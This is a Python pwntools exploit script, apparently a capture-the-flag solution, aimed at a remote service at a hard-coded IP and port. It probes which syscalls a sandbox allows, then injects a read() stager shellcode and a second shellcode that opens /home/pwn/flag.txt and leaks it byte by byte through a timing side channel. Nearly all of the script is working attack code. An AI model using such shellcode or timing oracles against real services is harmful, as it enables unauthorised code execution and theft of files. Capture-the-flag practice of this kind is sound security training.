from pwn import * 
import time 

context.clear(arch="amd64")

def check_rules(system_value) :  
    sh = remote("138.68.67.161", 20001)
    sh.recvuntil("no)\n")

    payload = """
    xor rax, rax;
    mov al, {};
    syscall;
    ud2;
    """.format(system_value) 
    sh.send("Y\0" + asm(payload))
    if "Illegal instruction" in sh.recv() : 
        return 1 
    else : 
        return 0

# ultimate rce  
# read(0, $rip, 0xff) 
shellcode1 = """
    push rbx;
    push rbx;
    pop rax;
    pop rdi;
    mov dh, 0xff;
    pop rsi;
    syscall;
"""

"""
Timing attack 
Read flag from file 
-> compare with bruteforce bytes 
-> True : infinite loop -> more time
-> False : exit() 
"""
shellcode2 = (
    shellcraft.open("/home/pwn/flag.txt") + 
    shellcraft.open("/home/pwn/flag.txt") +
    shellcraft.read(fd="rax", buffer="rsp", count=0x100) + 
    "mov al, [rsp + {}];" + 
    "cmp al, {};" + 
    "jne done;" + 
    "mov rcx, 0x2ffffff;" + 
    "times : \n  loop times; \n done:;" + 
    shellcraft.exit(0) 

)

def bruteforce(idx, c) : 
    payload = "Y\x00"
    payload += asm(shellcode1) 
    payload += "\x90" * 11          # padding 
    payload += asm(shellcode2.format(idx, c)) 
    start = time.time() 
    sh.send(payload) 
    try : 
        sh.recv()
    except EOFError : 
        pass 
    
    if time.time() - start > 0.5 :  
        print(time.time() - start)
        return 1 
    else : 
        print(time.time() - start)
        return 0 
sh = remote("138.68.67.161", 20001)
sh.recvuntil("no)\n")
print(bruteforce(0, ord('H')))

# if __name__ == "__main__" : 
#     flag = "" 
#     for i in range(256) : 
#         bruteforce(len(flag), i) 